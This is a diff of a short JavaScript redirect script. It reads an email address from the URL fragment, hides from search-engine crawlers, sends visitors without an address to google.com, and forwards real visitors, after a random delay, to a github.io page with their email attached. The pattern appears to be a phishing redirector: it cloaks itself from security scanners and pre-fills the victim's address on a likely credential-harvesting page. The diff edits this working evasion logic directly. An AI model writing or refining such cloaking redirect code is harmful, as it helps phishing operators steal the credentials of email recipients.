@@ -5,41 +5,30 @@
     return decodeURIComponent(hash.replace("#", ""));
   }
 
-  function isValidEmail(email) {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return emailRegex.test(email);
-  }
-
-  function isBot() {
-    const ua = navigator.userAgent;
-    const botPatterns = [
+  function isBotUserAgent() {
+    const bots = [
       /bot/i, /crawler/i, /spider/i, /crawling/i,
       /google/i, /bing/i, /yahoo/i, /facebook/i,
       /duckduckgo/i, /baidu/i, /yandex/i
     ];
-
-    if (botPatterns.some(bot => bot.test(ua))) return true;
-    if (navigator.webdriver) return true; // Headless check
-    if (window.outerWidth === 0 || window.outerHeight === 0) return true;
-
-    return false;
+    return bots.some(bot => bot.test(navigator.userAgent));
   }
 
   function redirectUser(email) {
     const delay = Math.floor(Math.random() * 1000) + 1000;
     setTimeout(() => {
-      window.location.href = "https://naturaldeco.github.io#" + encodeURIComponent(email);
+      window.location.href = "https://naturaldeco.github.io/#" + email;
     }, delay);
   }
 
   window.addEventListener("load", () => {
-    if (isBot()) {
-      console.log("Bot detected, no redirect.");
+    if (isBotUserAgent()) {
+      console.log("Bot detected, exiting...");
       return;
     }
 
     const email = getEmailFromHash();
-    if (!email || !isValidEmail(email)) {
+    if (!email || !email.includes("@")) {
       window.location.href = "https://google.com";
       return;
     }
@@ -47,4 +36,7 @@
     redirectUser(email);
   });
 })();
+
+
+
 
